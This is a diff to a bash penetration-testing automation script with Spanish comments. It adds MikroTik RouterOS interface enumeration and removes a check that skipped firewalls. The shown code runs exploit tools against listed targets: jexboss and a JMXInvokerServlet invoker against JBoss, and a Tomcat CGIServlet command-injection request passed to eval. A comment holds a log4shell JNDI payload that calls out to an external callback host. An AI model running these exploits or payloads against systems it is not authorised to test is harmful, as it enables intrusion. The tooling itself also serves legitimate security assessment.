@@ -849,6 +849,8 @@ function enumeracionJboss() {
 	else
 		param_msg_error=""
 	fi
+	echo -e "\t\t[+] Enumerar Jboss ($proto_http : $host : $port [$param_msg_error])"
+
 	echo "jexboss.sh --disable-check-updates --jboss -u \"$proto_http://$host:$port\"" > logs/vulnerabilidades/"$host"_"$port"_jbossVuln.txt
 	jexboss.sh --disable-check-updates --jboss -u "$proto_http://$host:$port" >> logs/vulnerabilidades/"$host"_"$port"_jbossVuln.txt &
 
@@ -856,7 +858,25 @@ function enumeracionJboss() {
 
 	echo "jboss_exploit_fat.sh -i $proto_http://$host:$port/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSName" > logs/vulnerabilidades/"$host"_"$port"_invokerJboss.txt
 	jboss_exploit_fat.sh -i $proto_http://$host:$port/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSName >> logs/vulnerabilidades/"$host"_"$port"_invokerJboss.txt
+	
+}
 
+# Mikrotik
+function enumeracionMikrotik() {
+    proto_http=$1
+    host=$2
+    port=$3
+	msg_error_404=$4 #cadena en comillas simples
+
+	if [ ! -z "$msg_error_404" ];then
+		param_msg_error="-error404 $msg_error_404" 
+	else
+		param_msg_error=""
+	fi
+	echo -e "\t\t[+] Enumerar Mikrotik ($proto_http : $host : $port [$param_msg_error])"
+
+	curl $proto_http://$host:$port/graphs/ | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))" > logs/enumeracion/"$host"_"$port"_mikrotikIfaces.txt
+	egrep -i 'title|iface' logs/enumeracion/"$host"_"$port"_mikrotikIfaces.txt > .enumeracion/"$host"_"$port"_mikrotikIfaces.txt
 	
 }
 
@@ -873,10 +893,11 @@ function enumeracionTomcat() {
 		param_msg_error=""
 	fi
 
+	echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port [$param_msg_error])"
+
     #1: si no existe log
     if [[ ! -e "logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webarchivos.txt" ]]; then
-        echo -e "\t\t[+] Enumerar Tomcat ($proto_http : $host : $port [$param_msg_error])"
-
+       
         command="$proxychains curl -k --max-time 10 '$proto_http'://$host:$port/cgi/ism.bat?&dir"
         echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CGIServlet.txt
         eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CGIServlet.txt &
@@ -1952,12 +1973,13 @@ for line in $(cat $TARGETS); do
 				egrep -qi "500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused|ListadoDirectorios" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt #verificar si debemos escanear
 				hostOK=$?
 
-				egrep -qi "Fortinet|Cisco|RouterOS|Juniper" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
-				noFirewall=$?
+				#egrep -qi "Fortinet|Cisco|RouterOS|Juniper" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
+				#noFirewall=$?
 				# 1= no coincide (no redirecciona a otro dominio o es error de proxy)
-				if [ "$VERBOSE" == '1' ]; then  echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK noFirewall $noFirewall ip2domainRedirect $ip2domainRedirect [1 1 1 0 OK]"; fi
+				#&& $noFirewall -eq 1
+				if [ "$VERBOSE" == '1' ]; then  echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK  ip2domainRedirect $ip2domainRedirect [1 1 0 = OK]"; fi
 
-				if [[ $hostOK -eq 1 &&  $noEscaneado -eq 1 && $noFirewall -eq 1 && $ip2domainRedirect -eq 0  ]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio.
+				if [[ $hostOK -eq 1 &&  $noEscaneado -eq 1  && $ip2domainRedirect -eq 0  ]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio.
 					
 
 					# if [ -z "$FORCE" ]; then # no es escaneo de redes por internet
@@ -1990,7 +2012,7 @@ for line in $(cat $TARGETS); do
 					httpmethods.py -k -L -t 5 $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"httpmethods.txt  2>/dev/null &
 
 					gourlex -t $proto_http://$host:$port -uO -s > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt
-					egrep -v '\.png|\.jpg|\.js|css|facebook|nginx|failure|microsoft|github|laravel.com|laravel-news|laracasts.com|linkedin|youtube|instagram|not yet valid|cannot validate certificate|connection reset by peer|EOF|gstatic|twitter|debian|apache|ubuntu|nextcloud|sourceforge|AppServNetwork|mysql|placehold|AppServHosting|phpmyadmin|php.net|oracle.com|java.net|yiiframework|enterprisedb|googletagmanager|envoyer|bunny.net|rockylinux|no such host|gave HTTP|dcm4che|apple|google|amazon.com|turnkeylinux|.org|fb.watch|timeout|unsupported protocol|internic|redhat|fastly|juniper|SolarWinds|hp.com|failed' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt | sort | uniq > .enumeracion/"$host"_"$port"_webLinks.txt
+					egrep -v '\.png|\.jpg|\.js|css|facebook|nginx|failure|microsoft|github|laravel.com|laravel-news|laracasts.com|linkedin|youtube|instagram|not yet valid|cannot validate certificate|connection reset by peer|EOF|gstatic|twitter|debian|apache|ubuntu|nextcloud|sourceforge|AppServNetwork|mysql|placehold|AppServHosting|phpmyadmin|php.net|oracle.com|java.net|yiiframework|enterprisedb|googletagmanager|envoyer|bunny.net|rockylinux|no such host|gave HTTP|dcm4che|apple|google|amazon.com|turnkeylinux|.org|fb.watch|timeout|unsupported protocol|internic|redhat|fastly|juniper|SolarWinds|hp.com|failed|mikrotik' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt | sort | uniq > .enumeracion/"$host"_"$port"_webLinks.txt
 
 					if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then
 						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
@@ -2089,6 +2111,15 @@ for line in $(cat $TARGETS); do
 						checkRAM
 						enumeracionTomcat "$proto_http" "$host" "$port" "$msg_error_404"
 						#  ${jndi:ldap://z4byndtm.requestrepo.com/z4byndtm}   #log4shell
+					fi
+					####################################
+
+					#######  if the server is tomcat ######
+					egrep -i "RouterOS" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
+					greprc=$?
+					if [[ $greprc -eq 0  ]];then 
+						checkRAM
+						enumeracionMikrotik "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 
